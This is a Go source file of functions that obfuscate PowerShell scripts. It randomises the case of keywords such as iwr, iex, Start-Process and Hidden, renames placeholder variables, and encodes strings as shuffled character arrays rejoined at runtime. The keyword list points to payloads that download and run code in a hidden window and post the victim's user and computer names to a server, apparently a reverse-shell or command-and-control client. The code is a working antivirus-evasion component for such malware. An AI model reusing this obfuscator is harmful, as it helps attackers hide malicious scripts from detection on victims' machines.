package main

import (
	"math/rand"
	"strconv"
	"strings"
)

func xuplow(s string) string {
	var result string

	for i:=0;i<len(s);i++ {
		if rand.Intn(100) % 2 == 0 {
			result += strings.ToLower(string(s[i]))
		} else {
			result += strings.ToUpper(string(s[i]))
		}
	}

	return result
}


func shuffleString(s string) (string, []int) {
	runes := []rune(s)
	n := len(runes)

	// Generate a random key
	key := rand.Perm(n)

	// Shuffle the string based on the key
	shuffledRunes := make([]rune, n)
	for i, k := range key {
		shuffledRunes[i] = runes[k]
	}

	// Generate the correct key for the shuffled string
	correctKey := make([]int, n)
	for i, k := range key {
		correctKey[k] = i
	}

	return string(shuffledRunes), correctKey
}

func pws_makeshuffel(s string) string {
	shuffeled, key := shuffleString(s)

	var arr_key string
	for i:=0;i<len(key);i++ {
		arr_key += strconv.Itoa(key[i]) + ","
	}
	arr_key = arr_key[0:len(arr_key) - 1]

	var result string = "(("+"'"+shuffeled+"'"+"["+arr_key+"]"+")-"+xuplow("join")+"'')"

	return result
}


func xobfuscate(content string) string {
	var obfuscated string = content

	var index int = 1
	for {
		if !strings.Contains(obfuscated,"$var"+strconv.Itoa(index)) {
			break
		}

		index++
	}

	index--
	
	var uplow []string = []string {
		"Start-Process", "Argument-List", "$PSHOME\\powershell.exe", "for", "try", "catch", "$env:USERNAME", "$env:COMPUTERNAME", "char", "UseBasicParsing", "Method", "Post", "Sleep", "if", "Out-String", "Body", "Hidden", "WindowStyle", "iwr", "iex", "Content",
	}

	for i:=0;i<len(uplow);i++ {
		obfuscated = strings.ReplaceAll(obfuscated, uplow[i], xuplow(uplow[i]))
	}


	var new_vars []string

	for i:=0;i<index;i++ {
		new_vars = append(new_vars, strconv.Itoa(rand.Intn(1000000)))
	}

	for i:=0;i<index;i++ {
		obfuscated = strings.ReplaceAll(obfuscated, "$var"+strconv.Itoa(i), "$"+new_vars[i])
	}

	return obfuscated
}